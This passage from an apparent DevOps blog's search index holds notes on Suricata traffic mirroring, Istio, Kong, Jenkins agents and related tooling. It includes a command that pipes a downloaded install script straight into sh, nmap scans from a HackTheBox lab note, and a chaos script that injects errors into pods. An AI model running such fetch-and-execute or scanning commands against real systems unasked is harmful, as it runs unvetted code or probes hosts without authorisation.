[\u0026#34;your_es_ip:9200\u0026#34;] 6 username: \u0026#34;xxxxx\u0026#34; 7 password: \u0026#34;xxxxx\u0026#34; Enable filebeat modules 1sudo filebeat modules enable suricata 2sudo filebeat setup 3sudo systemctl start filebeat.service 4# SSH tunnel to Kibana 5ssh -L 5601:your_kibana_ip:5601 username@server.ip -N Create traffic mirror target in AWS create traffic mirror in aws VPC plane\nTarget settings: suricata-instance Choose target: suricata ec2 network interface id Create traffic mirror filter: Rule number: 100 Rule action: accept Protocol: TCP Source CIDR Block: 0.0.0.0/0 Destination CIDR Block: 0.0.0.0/0 Create traffic mirror session： Select source needs monitor traffic network interface in VPC Select suricata-instance as target Seclect custom filter rule Go to suricata ec2 instance view traffic logs or go to Elastic kibana dashboard 1sudo apt install jq 2jq \u0026#39;select(.alert .signature_id==2100498)\u0026#39; /var/log/suricata/eve.json Stop and Disable Suricata 1systemctl disable suricata 2systemctl stop suricata how to install suricata\n","link":"https://blog.wisekee.com/post/aws-traffic-analysis/","section":"post","tags":["Security","intrusion detection","Traffic"],"title":"AWS traffic security analysis and mirror"},{"body":"","link":"https://blog.wisekee.com/tags/intrusion-detection/","section":"tags","tags":null,"title":"intrusion detection"},{"body":"","link":"https://blog.wisekee.com/tags/traffic/","section":"tags","tags":null,"title":"Traffic"},{"body":"View all listener 1lsof -i Login in kubernetes node use ssh Find out the container 1#find process id in specific container 2docker top `docker ps|grep \u0026#34;istio-proxy_productpage\u0026#34;|cut -d \u0026#34; \u0026#34; -f1` 3# find the pid and use nsenter to container network namespace 4nsenter -n --target PID 5# View the details of the rule configuration in the NAT table. 6iptables -t nat -L -v Debug the container use nicolaka/netshoot A Docker + Kubernetes network trouble-shooting swiss-army container netshoot 1docker run -it --net container:\u0026lt;container_name\u0026gt; nicolaka/netshoot ","link":"https://blog.wisekee.com/post/docker-nsenter-container-network/","section":"post","tags":["docker","kubernetes"],"title":"Debug the docker container network use nsenter command"},{"body":"","link":"https://blog.wisekee.com/tags/debain/","section":"tags","tags":null,"title":"Debain"},{"body":"How to upgrade the some packages 1dpkg -L libssh2-1 # view the package use which files 2dpkg -s libssh2-1 # view the package infos 3# install the checkinstall 4echo \u0026#34;deb http://ftp.de.debian.org/debian bullseye main\u0026#34; \u0026gt;\u0026gt; /etc/apt/sources.list 5apt update 6apt install checkinstall 7tar -zxvf source-app.tar.gz 8cd source 9./configure 10make 11checkinstall --install=no Upgrade the single package in debian 1apt-cache madison systemd 2apt-get install libglib2.0-0=2.66.8-1+deb11u3 relative the docs about debian repo debian releases support versions for stretch old debian 1# pls reference: https://www.debian.org/security/ 2sed -i -e \u0026#34;2 {s/^/#/}\u0026#34; -e \u0026#34;4 {s/^/#/}\u0026#34; -e \u0026#34;6 {s/^/#/}\u0026#34; /etc/apt/sources.list 3echo \u0026#34;deb http://security.debian.org/debian-security bullseye-security main contrib non-free\u0026#34; \u0026gt;\u0026gt; /etc/apt/sources.list 4apt-get update \u0026amp;\u0026amp; apt-get upgrade ","link":"https://blog.wisekee.com/post/update-the-old-debian-repo/","section":"post","tags":["Debain","System","Docker"],"title":"How to update the out of date debian docker image"},{"body":"","link":"https://blog.wisekee.com/tags/system/","section":"tags","tags":null,"title":"System"},{"body":"Define pattern for log groups in cloudwatch Create filter pattern filter pattern: [action, azid, bytes, dstaddr,dstport,instanceid,protocol,srcaddr,srcport,subnetid] Metric namespaces Name for metric namespace Metric name: bytes Metric value: $bytes Unit: Bytes Dimensions: Dimension Name: dst-addr, Dimension Value: $dstaddr Determine NAT gateway logs 1# if network interface format is: 2# ${version} ${account-id} ${interface-id} ${srcaddr} ${dstaddr} ${srcport} ${dstport} ${protocol} ${packets} ${bytes} ${start} ${end} ${action} ${log-status} 3fields @timestamp 4| parse @message \u0026#34;* * * * * * * * * *\u0026#34; as action, azid, bytes, dstaddr,dstport,instanceid,protocol,srcaddr,srcport,subnetid 5| stats sum(bytes) as bytesTransferred by srcaddr, dstaddr 6| sort bytesTransferred desc VPC transit gateway flow logs Create filter pattern [version, resource_type, account_id,tgw_id, tgw_attachment_id, tgw_src_vpc_account_id, tgw_dst_vpc_account_id, tgw_src_vpc_id, tgw_dst_vpc_id, tgw_src_subnet_id, tgw_dst_subnet_id, tgw_src_eni, tgw_dst_eni, tgw_src_az_id, tgw_dst_az_id, tgw_pair_attachment_id, srcaddr, dstaddr, srcport, dstport, protocol, packets, bytes,start,end, log_status, type,packets_lost_no_route, packets_lost_blackhole, packets_lost_mtu_exceeded, packets_lost_ttl_expired, tcp_flags,region, flow_direction, pkt_src_aws_service, pkt_dst_aws_service] Metric namespaces Name for metric namespace Metric name: bytes Metric value: $bytes Unit: Bytes Dimensions: Dimension Name: account_id, Dimension Value: $account_id Determine VPC transit gateway logs 1fields @timestamp 2 | parse @message \u0026#34;* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *\u0026#34; as version, resource_type, account_id,tgw_id, tgw_attachment_id, tgw_src_vpc_account_id, tgw_dst_vpc_account_id, tgw_src_vpc_id, tgw_dst_vpc_id, tgw_src_subnet_id, tgw_dst_subnet_id, tgw_src_eni, tgw_dst_eni, tgw_src_az_id, tgw_dst_az_id, tgw_pair_attachment_id, srcaddr, dstaddr, srcport, dstport, protocol, packets, bytes,start,end, log_status, type,packets_lost_no_route, packets_lost_blackhole, packets_lost_mtu_exceeded, packets_lost_ttl_expired, tcp_flags,region, flow_direction, pkt_src_aws_service, pkt_dst_aws_service 3| sort bytes desc ","link":"https://blog.wisekee.com/post/aws-logs-insight/","section":"post","tags":["logs","aws","insight"],"title":"AWS vpc flow logs insight"},{"body":"","link":"https://blog.wisekee.com/tags/insight/","section":"tags","tags":null,"title":"insight"},{"body":"proxychains ng (new generation) - a preloader which hooks calls to sockets in dynamically linked programs and redirects it through one or more socks/http proxies. continuation of the unmaintained proxychains project https://github.com/rofl0r/proxychains-ng\nInstall 1# On macos 2 HOMEBREW_NO_UPDATE=1 brew install proxychains-ng 3# On linux 4# needs a working C compiler, preferably gcc 5 ./configure --prefix=/usr --sysconfdir=/etc 6 make 7 sudo make install 8 sudo make install-config (installs proxychains.conf) Configuration Create and config file path ~/.proxychains/proxychains.conf proxychains looks for config file in following order:\nfile listed in environment variable PROXYCHAINS_CONF_FILE or provided as a -f argument to proxychains script or binary. ./proxychains.conf $(HOME)/.proxychains/proxychains.conf $(sysconfdir)/proxychains.conf 1[ProxyList] 2socks5 127.0.0.1 10001 Testing Put proxychain command to your\u0026rsquo;s program front.\n1proxychains4 python3 ./hello.py Other Tunnel soluations https://github.com/claroty/netunnel https://github.com/fatedier/frp https://github.com/ph4ntonn/Stowaway ","link":"https://blog.wisekee.com/post/local-proxychain-tools/","section":"post","tags":["networking","proxy","security"],"title":"Local fast proxy chain access tool"},{"body":"","link":"https://blog.wisekee.com/tags/logs/","section":"tags","tags":null,"title":"logs"},{"body":"","link":"https://blog.wisekee.com/tags/networking/","section":"tags","tags":null,"title":"networking"},{"body":"","link":"https://blog.wisekee.com/tags/proxy/","section":"tags","tags":null,"title":"proxy"},{"body":"When upgraded the Docker Desktop it\u0026rsquo;s can\u0026rsquo;t starting in MacOs\nUse AppCleaner remove Docker Destop Open Activity Monitor Force quit the Docker and Docker backend process, then open AppCleaner drag the Docker icon in Application list to AppCleaner remove the Docker\nDownload Dokcer.dmg in Docker offical site and reinstalling 1 sudo hdiutil attach Docker.dmg 2 sudo /Volumes/Docker/Docker.app/Contents/MacOS/install 3 sudo hdiutil detach /Volumes/Docker Setings and change if maybe not working sudo vi ~/Library/Group\\ Containers/group.com.docker/settings.json set filesharingDirectories: [] strip the mount folder sudo chmod 777 ~/Library/Application\\ Support View the launch logs cd ~/Library/Group\\ Containers/group.com.docker \u0026amp;\u0026amp; less DockerAppStderr.txt On the MacOS m1 needs update software components softwareupdate --install-rosetta ","link":"https://blog.wisekee.com/post/macos-docker-notworking/","section":"post","tags":["Docker","cncf","MacOS"],"title":"Docker can't start in mac os"},{"body":"installing the istio 1# downloading the istio compress archive and the script will auto uncompress 2curl -L https://istio.io/downloadIstio | ISTIO_VERSION=1.16.1 sh - 3# for easier usage 4export PATH=$PWD/bin:$PATH 5# check the version 6./bin/istioctl version 7# check the requirments 8./bin/istioctl x precheck 9# installing components to local k8s cluster 10./bin/istioctl install --set profile=demo -y 11# enable injection in the default namespace 12kubectl label namespace default istio-injection=enabled 13# verify the install result 14istioctl verify-install Generally commands 1k get MutatingWebhookConfiguration 2k get validatingWebhookConfiguration 3kubectl describe configmap istio-sidecar-injector -n istio-system 4istioctl proxy-config secret istio-ingressgateway-xxxxxxx.istio-system 5istioctl analyze 6istioctl proxy-status 7# view routes 8istioctl proxy-config routes deploy/istio-ingressgateway.istio-system 9# view ingress gateway cluster config 10istioctl proxy-config cluster -n istio-system istio-ingressgateway-56554558b7-4ptls 11# view the listeners 12istioctl proxy-config listeners reviews-v3-5c5cc7b6d-hpkd2.apps 13# view specific listener 14istioctl proxy-config listeners reviews-v3-5c5cc7b6d-hpkd2.apps --port 15001 -o yaml 15# open the envoy admin portal in local host to view all stats and metrics and configs 16istioctl dash envoy deploy/pod-xxxx -n ns 17# view the all clusters in pod 18kubectl exec \u0026#34;$(kubectl get pod -l app=helloworld -o jsonpath=\u0026#39;{.items[0].metadata.name}\u0026#39;)\u0026#34; -c istio-proxy -- curl -sS 0:15000/clusters Deploy the Testing Apps 1kubectl apply -f samples/sleep/sleep.yaml 2export SOURCE_POD=$(kubectl get pod -l app=sleep -o jsonpath={.items..metadata.name}) 3kubectl apply -f samples/httpbin/httpbin.yaml Enable Envoy logs 1apiVersion: telemetry.istio.io/v1alpha1 2kind: Telemetry 3metadata: 4 name: mesh-default 5 namespace: istio-system 6spec: 7 accessLogging: 8 - providers: 9 - name: Envoy Testing 1# Testing from sleep pod to httpbin 2kubectl exec \u0026#34;$SOURCE_POD\u0026#34; -c sleep -- curl -sS httpbin:8000/status/418 3# View the httpbin istio-proxy logs 4kubectl logs -l app=httpbin -c istio-proxy Filter the accesslog through telemetry 1apiVersion: telemetry.istio.io/v1alpha1 2kind: Telemetry 3metadata: 4 name: mesh-default 5 namespace: istio-system 6spec: 7 accessLogging: 8 - providers: 9 - name: Envoy 10 filter: 11 expression: \u0026#34;request.url_path != \u0026#39;/status\u0026#39; \u0026amp;\u0026amp; request.url_path != \u0026#39;/liveness\u0026#39; \u0026amp;\u0026amp; request.url_path != \u0026#39;/readiness\u0026#39;\u0026#34; reapply the config kubectl apply -f telemetry.yaml Then the istio-proxy sidecar (Envoy) will only log entries where the request URL path isn’t /status, /liveness, or /readiness Also use EnvoyFilter CR to filter First delete telemtry resource kubectl delete -f telemetry.yaml 1apiVersion: networking.istio.io/v1alpha3 2kind: EnvoyFilter 3metadata: 4 name: access-log 5spec: 6 configPatches: 7 - applyTo: NETWORK_FILTER 8 match: 9 context: ANY 10 listener: 11 filterChain: 12 filter: 13 name: \u0026#34;Envoy.filters.network.http_connection_manager\u0026#34; 14 patch: 15 operation: MERGE 16 value: 17 typed_config: 18 \u0026#34;@type\u0026#34;: \u0026#34;type.googleapis.com/envoy.extensions.filters.network.http_connection_manager.v3.HttpConnectionManager\u0026#34; 19 access_log: 20 - name: Envoy.file_access_log 21 typed_config: 22 \u0026#34;@type\u0026#34;: \u0026#34;type.googleapis.com/envoy.extensions.access_loggers.file.v3.FileAccessLog\u0026#34; 23 path: /dev/stdout 24 format: \u0026#34;[%START_TIME%] \\\u0026#34;%REQ(:METHOD)% %REQ(X-ENVOY-ORIGINAL-PATH?:PATH)% %PROTOCOL%\\\u0026#34; %RESPONSE_CODE% %RESPONSE_CODE_DETAILS% \\\u0026#34;%RESP(GRPC-STATUS)% %RESP(GRPC-MESSAGE)%\\\u0026#34; %RESPONSE_FLAGS% %BYTES_RECEIVED% %BYTES_SENT% %DURATION% %RESP(X-ENVOY-UPSTREAM-SERVICE-TIME)% \\\u0026#34;%REQ(X-FORWARDED-FOR)%\\\u0026#34; \\\u0026#34;%REQ(USER-AGENT)%\\\u0026#34; \\\u0026#34;%REQ(X-REQUEST-ID)%\\\u0026#34; \\\u0026#34;%REQ(:AUTHORITY)%\\\u0026#34; \\\u0026#34;%UPSTREAM_HOST%\\\u0026#34;\\n\u0026#34; 25 filter: 26 and_filter: 27 filters: 28 - header_filter: 29 header: 30 name: :Path 31 string_match: 32 exact: /status 33 invert_match: true 34 - header_filter: 35 header: 36 name: :Path 37 string_match: 38 exact: /liveness 39 invert_match: true 40 - header_filter: 41 header: 42 name: :Path 43 string_match: 44 exact: /readiness 45 invert_match: true Disable the Envoy response headers when client request from gateway outbounds 1apiVersion: networking.istio.io/v1alpha3 2kind: EnvoyFilter 3metadata: 4 name: remove-gateway-response-headers 5 namespace: istio-system 6spec: 7 configPatches: 8 - applyTo: NETWORK_FILTER 9 match: 10 context: GATEWAY 11 listener: 12 filterChain: 13 filter: 14 name: envoy.filters.network.http_connection_manager 15 patch: 16 operation: MERGE 17 value: 18 typed_config: 19 \u0026#39;@type\u0026#39;: \u0026gt;- 20 type.googleapis.com/envoy.extensions.filters.network.http_connection_manager.v3.HttpConnectionManager 21 server_header_transformation: PASS_THROUGH 22 - applyTo: ROUTE_CONFIGURATION 23 match: 24 context: GATEWAY 25 patch: 26 operation: MERGE 27 value: 28 response_headers_to_remove: 29 - x-envoy-upstream-service-time 30 - server Launch the sample Catalog service Create istioinaction namespace and enabled the istio proxy sidecar\n1# create namespace 2k create namespace istioinaction 3# set default namespace when operation the k8s 4k config set-context $(k config current-context) --namespace istioinaction 5# clone Catalog service code 6git clone https://github.com/istioinaction/book-source-code.git 7# build the docker image 8cd services/catalog \u0026amp;\u0026amp; ./docker-build.sh 9# apply the catalog kubernetes resources 10k apply -f services/catalog/kubernetes/catalog.yaml 11# testing catalog service api 12curl -s http://catalog.istioinaction/items/1 Launch the sample Webapp service Build the istioinaction/webapp docker image 1# build the webapp image 2cd services/webapp \u0026amp;\u0026amp; ./docker-build.sh Apply the webapp k8s resources 1k apply -f services/catalog/kubernetes/webapp.yaml Testing the webapp service 1curl -s http://webapp.istioinaction/api/catalog/items/1 2# forward the service to local 3k port-forward deploy/webapp 8080:8080 Create virtualService and gateway for webapp enter and apply resource manifests 1cd ./book-source-code/ch2 \u0026amp;\u0026amp; k apply -f ingress-gateway.yaml the ingress-gateway.yaml like following 1apiVersion: networking.istio.io/v1alpha3 2kind: Gateway 3metadata: 4 name: outfitters-gateway 5 namespace: istioinaction 6spec: 7 selector: 8 istio: ingressgateway # use istio default controller 9 servers: 10 - port: 11 number: 80 12 name: http 13 protocol: HTTP 14 hosts: 15 - \u0026#34;*\u0026#34; 16--- 17apiVersion: networking.istio.io/v1alpha3 18kind: VirtualService 19metadata: 20 name: webapp-virtualservice 21 namespace: istioinaction 22spec: 23 hosts: 24 - \u0026#34;*\u0026#34; 25 gateways: 26 - outfitters-gateway 27 http: 28 - route: 29 - destination: 30 host: webapp 31 port: 32 number: 80 Check and debug the gateway and virtualservice 1# view the routes details 2istioctl proxy-config routes deploy/istio-ingressgateway.istio-system 3k get gateway --all-namespaces 4k get virtualservice --all-namespaces Chaos debug service Execute Chaos for catalog, this script make catlog service problem run ./bin/chaos.sh 500 100 1#!/usr/bin/env bash 2 3if [ $1 == \u0026#34;500\u0026#34; ]; then 4 5 POD=$(kubectl get pod | grep catalog | awk \u0026#39;{ print $1 }\u0026#39;) 6 echo $POD 7 8 for p in $POD; do 9 if [ ${2:-\u0026#34;false\u0026#34;} == \u0026#34;delete\u0026#34; ]; then 10 echo \u0026#34;Deleting 500 rule from $p\u0026#34; 11 kubectl exec -c catalog -it $p -- curl -X POST -H \u0026#34;Content-Type: application/json\u0026#34; -d \u0026#39;{\u0026#34;active\u0026#34;: 12 false, \u0026#34;type\u0026#34;: \u0026#34;500\u0026#34;}\u0026#39; localhost:3000/blowup 13 else 14 PERCENTAGE=${2:-100} 15 kubectl exec -c catalog -it $p -- curl -X POST -H \u0026#34;Content-Type: application/json\u0026#34; -d \u0026#39;{\u0026#34;active\u0026#34;: 16 true, \u0026#34;type\u0026#34;: \u0026#34;500\u0026#34;, \u0026#34;percentage\u0026#34;: \u0026#39;\u0026#34;${PERCENTAGE}\u0026#34;\u0026#39;}\u0026#39; localhost:3000/blowup 17 echo \u0026#34;\u0026#34; 18 fi 19 done 20 21 22fi apply the VirutalService to catalog and retry the catalog while when execute script call api ,the correct more result while true; do curl http://localhost/api/catalog; sleep .5; done 1apiVersion: networking.istio.io/v1alpha3 2kind: VirtualService 3metadata: 4 name: catalog 5spec: 6 hosts: 7 - catalog 8 http: 9 - route: 10 - destination: 11 host: catalog 12 retries: 13 attempts: 3 14 retryOn: 5xx 15 perTryTimeout: 2s Circuit breaking 1$ kubectl apply -f - \u0026lt;\u0026lt;EOF 2apiVersion: networking.istio.io/v1alpha3 3kind: DestinationRule 4metadata: 5 name: httpbin 6spec: 7 host: httpbin 8 trafficPolicy: 9 loadBalancer: 10 consistentHash: 11 httpCookie: 12 name: user 13 ttl: 0s 14 connectionPool: 15 tcp: 16 maxConnections: 1 17 http: 18 http1MaxPendingRequests: 1 19 maxRequestsPerConnection: 1 20 outlierDetection: 21 consecutive5xxErrors: 1 22 interval: 1s 23 baseEjectionTime: 3m 24 maxEjectionPercent: 100 25EOF Use VirtualService to redirect the request to other host 1apiVersion: networking.istio.io/v1alpha3 2kind: VirtualService 3metadata: 4 name: redirect-302 5 namespace: istio-system 6spec: 7 gateways: 8 - istio-gateway 9 hosts: 10 - origin.test.com 11 http: 12 - redirect: 13 authority: redirect.demo.com 14 headers: 15 response: 16 set: 17 location: \u0026#34;https://redirect.demo.com\u0026#34; Extends the functionality Wasm practice wasm plugin example dynamic refresh ecr token wasm oci pull scretes ","link":"https://blog.wisekee.com/post/istio-getting-started/","section":"post","tags":["istio","cncf","kubernetes"],"title":"istio getting started"},{"body":"","link":"https://blog.wisekee.com/tags/macos/","section":"tags","tags":null,"title":"MacOS"},{"body":"","link":"https://blog.wisekee.com/tags/bundle/","section":"tags","tags":null,"title":"Bundle"},{"body":"Initialization the structure 1# make the demo folder 2mkdir webpack-demo 3 4# init the project 5cd webpack-demo 6npm init -y 7npm install webpack webpack-cli --save-dev 8 9# set the project to private prevent and accidental publish to public hub 10# add the `\u0026#34;private\u0026#34;: true,` to package.json 11 12# create config file for webpack keep empty temporary 13touch webpack.config.js 14 15mkdir dist src 16touch dist/index.html 17touch src/index.js A little the code to src/index.js 1function component() { 2 const el = document.createElement(\u0026#39;div\u0026#39;); 3 el.innerHTML = \u0026#34;\u0026lt;span\u0026gt;Hello World!\u0026lt;/span\u0026gt;\u0026#34;; 4 return el; 5} 6 7 8document.body.appendChild(component()) Also the code about the dist/index.html 1\u0026lt;!DOCTYPE html\u0026gt; 2\u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; 3\u0026lt;head\u0026gt; 4 \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; 5 \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1.0\u0026#34;\u0026gt; 6 \u0026lt;title\u0026gt;Webpack Demo\u0026lt;/title\u0026gt; 7\u0026lt;/head\u0026gt; 8\u0026lt;body\u0026gt; 9 10\u0026lt;script src=\u0026#34;main.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; 11\u0026lt;/body\u0026gt; 12\u0026lt;/html\u0026gt; Launch the mini example You can use the VS Code plugin to hot load the change for html and js vscode live server\n1npx webpack 2 3# change the package.json add: \u0026#34;start\u0026#34;: \u0026#34;webpack serve --open\u0026#34; Reference Webpack basic setup The Opentelemetry web example ","link":"https://blog.wisekee.com/post/webpack-sample-settings/","section":"post","tags":["Frontend","Webpack","Bundle"],"title":"Use webpack bundle the frontend sample example"},{"body":"","link":"https://blog.wisekee.com/tags/webpack/","section":"tags","tags":null,"title":"Webpack"},{"body":"","link":"https://blog.wisekee.com/tags/kong/","section":"tags","tags":null,"title":"kong"},{"body":"Installing the Kong use docker compose 1git clone https://github.com/Kong/docker-kong 2cd docker-kong/compose/ 3KONG_DATABASE=postgres docker-compose --profile database up Running Kong admin use docker 1# refer to network name with kong docker compose resource same. 2# https://hub.docker.com/r/pantsel/konga/ 3docker run --platform=linux/amd64 -it --rm -p 1337:1337 --network compose_kong-net --name konga -e \u0026#34;NODE_ENV=production\u0026#34; -e \u0026#34;TOKEN_SECRET=xxxxxxx\u0026#34; pantsel/konga Setting Kong 1# add kong admin api to services 2curl --location --request POST \u0026#39;http://localhost:8001/services/\u0026#39; \\ 3--header \u0026#39;Content-Type: application/json\u0026#39; \\ 4--data-raw \u0026#39;{ 5 \u0026#34;name\u0026#34;: \u0026#34;admin-api\u0026#34;, 6 \u0026#34;host\u0026#34;: \u0026#34;localhost\u0026#34;, 7 \u0026#34;port\u0026#34;: 8001 8}\u0026#39; 9# add admin api route 10curl --location --request POST \u0026#39;http://localhost:8001/services/admin-api/routes\u0026#39; \\ 11--header \u0026#39;Content-Type: application/json\u0026#39; \\ 12--data-raw \u0026#39;{ 13 \u0026#34;paths\u0026#34;: [\u0026#34;/admin-api\u0026#34;] 14}\u0026#39; 15# testing admin api from kong gateway 16curl localhost:8000/admin-api/ 17# enable key auth plugin for admin api 18curl -X POST http://localhost:8001/services/admin-api/plugins \\ 19 --data \u0026#34;name=key-auth\u0026#34; 20# add kong admin as consumer 21curl --location --request POST \u0026#39;http://localhost:8001/consumers/\u0026#39; \\ 22--form \u0026#39;username=konga\u0026#39; \\ 23--form \u0026#39;custom_id=cebd360d-3de6-4f8f-81b2-31575fe9846a\u0026#39; 24# create api key form konga 25curl --location --request POST \u0026#39;http://localhost:8001/consumers/e7b420e2-f200-40d0-9d1a-a0df359da56e/key-auth\u0026#39; https://dev.to/vousmeevoyez/setup-kong-konga-part-2-dan(reference configurations) https://github.com/vousmeevoyez/kong-konga-example https://github.com/Kuari/kong-konga-docker-compose ","link":"https://blog.wisekee.com/post/kong-and-konga-deployment/","section":"post","tags":["kong","cncf","konga"],"title":"Kong and Konga deployment"},{"body":"","link":"https://blog.wisekee.com/tags/konga/","section":"tags","tags":null,"title":"konga"},{"body":"","link":"https://blog.wisekee.com/tags/auto-tools/","section":"tags","tags":null,"title":"auto tools"},{"body":"Basic the Makefile format First make sure ~/.vimrc settings for tab spaces 1# define the .vimrc file to following contents 2cat ~/.vimrc 3set noexpandtab 4set autoindent Small snippet Makefile contents 1.DEFAULT_GOAL:=build 2 3fmt: 4\techo \u0026#34;this is fmt....\u0026#34; 5 6.PHONY:vet 7vet:fmt 8\techo \u0026#34;this is vet...\u0026#34; 9 10 11build:vet 12\techo \u0026#34;this is build...\u0026#34; In the directory execute make should display the result. 1echo \u0026#34;this is fmt....\u0026#34; 2this is fmt.... 3echo \u0026#34;this is vet...\u0026#34; 4this is vet... 5echo \u0026#34;this is build...\u0026#34; 6this is build... More complicated example 1#Ignore if has directory or file same name in current directory 2.PHONY:clean all 3# Set the global variables to use in back commands 4CC=gcc 5INCLUDE_DIR= 6C_FLAGS= 7 8# All sub dirs except debug directory, because the debug directory to last compile 9# Use awk to exclude debug 10SUBDIRS=$(shell ls -l | grep ^d | awk \u0026#39;{if($$9 != \u0026#34;debug\u0026#34;) if($$9 != \u0026#34;include\u0026#34;) print $$9}\u0026#39;) 11 12#Lastly go to debug directory 13#DEBUG=$(shell ls -l | grep ^d | awk \u0026#39;{if($$9 == \u0026#34;debug\u0026#34;) print $$9}\u0026#39;) 14 15#save current folder path to ROOT_DIR 16ROOT_DIR=$(shell pwd) 17 18#Finally application\u0026#39;s name 19BIN=myapp 20 21#the obj file directory 22OBJS_DIR=debug/obj 23 24#the bin file directory 25BIN_DIR=debug/bin 26 27#store the all .c source file to CUR_SOURCE directory 28CUR_SOURCE=${wildcard *.c} 29 30#construct the all obj file with .c file 31CUR_OBJS=${patsubst %.c, %.o, $(CUR_SOURCE)} 32 33#export all variables to sub directory\u0026#39;s Makefile 34export CC BIN OBJS_DIR BIN_DIR ROOT_DIR 35 36#order to exec target 37all:$(SUBDIRS) $(CUR_OBJS) DEBUG 38 39 40# recurseive exec sub dirs make 41# per exec echo the sub dir 42$(SUBDIRS):ECHO 43\tmake -C $@ 44 45DEBUG:ECHO 46\t#go to debug directory exec make 47\tmake -C debug 48 49# echo the current sub dir 50ECHO: 51\t@echo $(SUBDIRS) 52 53 54# compile the c file to obj save to relative obj dir 55$(CUR_OBJS):%.o:%.c 56\t$(CC) -c $^ -o $(ROOT_DIR)/$(OBJS_DIR)/$@ 57 58clean: 59\trm -rf $(OBJS_DIR)/*.o 60\trm -rf $(BIN_DIR)/* Define the function and call it in sections 1build: prebuild 2\t$(call print-target) 3\tGOOS=linux GOARCH=amd64 go build -trimpath -ldflags=\u0026#34;-s -w\u0026#34; -o detector main.go 4 5define print-target 6 @printf \u0026#34;Executing target: \\033[36m$@\\033[0m\\n\u0026#34; 7endef Reference (what-how-makefile)[https://opensource.com/article/18/8/what-how-makefile] (makefile tutorial)[https://makefiletutorial.com/] (balerter)[https://github.com/balerter/balerter/blob/master/Makefile] (Self-Documented Makefile)[https://marmelab.com/blog/2016/02/29/auto-documented-makefile.html] ","link":"https://blog.wisekee.com/post/makefile-getting-started/","section":"post","tags":["Makefile","task","auto tools"],"title":"Auto tools makefile getting started"},{"body":"","link":"https://blog.wisekee.com/tags/makefile/","section":"tags","tags":null,"title":"Makefile"},{"body":"","link":"https://blog.wisekee.com/tags/task/","section":"tags","tags":null,"title":"task"},{"body":"","link":"https://blog.wisekee.com/tags/hackthebox/","section":"tags","tags":null,"title":"hackthebox"},{"body":"HOMEBREW_NO_UPDATE=1 brew install inetutils\nnmap -A 10.129.186.124\nnmap -sV -sC X.X.X.X\n","link":"https://blog.wisekee.com/post/hackthebox-operations/","section":"post","tags":["hackthebox","tools"],"title":"Hackthebox generally "},{"body":"","link":"https://blog.wisekee.com/tags/tools/","section":"tags","tags":null,"title":"tools"},{"body":"","link":"https://blog.wisekee.com/tags/agent/","section":"tags","tags":null,"title":"Agent"},{"body":"","link":"https://blog.wisekee.com/tags/jenkins/","section":"tags","tags":null,"title":"Jenkins"},{"body":"Supplement When you upgrade the jenkins.war in docker container, commit to another tag the Entrypoint and CMD is lost So can commit specific the Entrypoint and CMD 1docker commit --change=\u0026#39;ENTRYPOINT [/usr/bin/tini\u0026#34;, \u0026#34;--\u0026#34;, \u0026#34;/usr/local/bin/jenkins.sh\u0026#34;]\u0026#39; --change=\u0026#39;CMD [/usr/local/bin/jenkins.sh\u0026#34;]\u0026#39; \u0026lt;container_id\u0026gt; new_image_name Basic settings Add Global credentials the Secret is kubernetes login token Add new cloud configure in Manage Jenkins \u0026ndash;\u0026gt; Clouds Config the Kubernetes Clouds websocket connection, use internal jenkins URL, specific the Pod Labels, Pod Retention: On Failure, Max connections, Seconds to wait for pod Add Pod template settings Specific Namespace, Usage: Only build jobs with label expressions matching this node Container Template: jnlp: jenkins/inbound-agent:latest, Working directory: /home/jenkins/agent Command to run: /usr/local/bin/jenkins-agent You can specific Volumes to mount cache etc. NPM, Maven, Nuget, PIP You can config more for pod template, merge the raw yaml to tolerations 1 apiVersion: v1 2 kind: Pod 3 spec: 4 affinity: 5 priorityClassName: normal 6 nodeAffinity: 7 requiredDuringSchedulingIgnoredDuringExecution: 8 nodeSelectorTerms: 9 - matchExpressions: 10 - key: node-group 11 operator: In 12 values: 13 - spotInstances 14 tolerations: 15 - key: \u0026#34;devops\u0026#34; 16 operator: \u0026#34;Equal\u0026#34; 17 value: \u0026#34;cicd\u0026#34; 18 effect: \u0026#34;NoSchedule\u0026#34; Write the pipeline use podtemplate 1node(\u0026#34;podTemplateName\u0026#34;) { 2 3 def rawData = \u0026#34;${params.DATA}\u0026#34; 4 def mapData = readJSON text: rawData 5 def AutoDeployRepoMap = [ 6 \u0026#34;https://local.test.git\u0026#34;: \u0026#34;xxxxxxxx\u0026#34; 7 ] 8 9 container(\u0026#34;podContainerName\u0026#34;) { 10 withCredentials([string(credentialsId: \u0026#39;task-token\u0026#39;, variable: \u0026#39;TOKEN\u0026#39;)]) { 11 def git_url = mapData[\u0026#39;project\u0026#39;][\u0026#39;git_http_url\u0026#39;] 12 if(AutoDeployRepoMap.containsKey(git_url)) { 13 deployId = AutoDeployRepoMap[\u0026#34;${git_url}\u0026#34;] 14 response = sh(script: \u0026#34;curl -X PUT -H \\\u0026#34;Authorization: Bearer ${TOKEN}\\\u0026#34; https://local.test.dev/api/v1/app/${deployId}/deploy?branch=${tag}\u0026#34;, returnStdout: true) 15 echo \u0026#34;response: ${response}\u0026#34; 16 } 17 } 18 } 19 20} Or inherit podtemplate to change the configure 1def CONTAINERS = [ 2 containerTemplate(args: \u0026#39;\u0026#39;, command: \u0026#39;sh\u0026#39;, image: \u0026#34;${params.SONAR_SCAN_BASE_IMAGE}\u0026#34;, livenessProbe: containerLivenessProbe(execArgs: \u0026#39;\u0026#39;, failureThreshold: 0, initialDelaySeconds: 0, periodSeconds: 0, successThreshold: 0, timeoutSeconds: 0), name: \u0026#39;sonarscan\u0026#39;, resourceLimitCpu: \u0026#39;2000m\u0026#39;, resourceLimitEphemeralStorage: \u0026#39;\u0026#39;, resourceLimitMemory: \u0026#39;4Gi\u0026#39;, resourceRequestCpu: \u0026#39;500m\u0026#39;, resourceRequestEphemeralStorage: \u0026#39;\u0026#39;, resourceRequestMemory: \u0026#39;500Mi\u0026#39;, ttyEnabled: true, workingDir: \u0026#39;/home/jenkins/agent\u0026#39;) 3] 4def GIT_COMMIT_EMAIL = \u0026#34;\u0026#34; 5 6if(params.CODE_LANGUAGE == \u0026#39;java\u0026#39; \u0026amp;\u0026amp; params.LANGUAGE_VERSION == 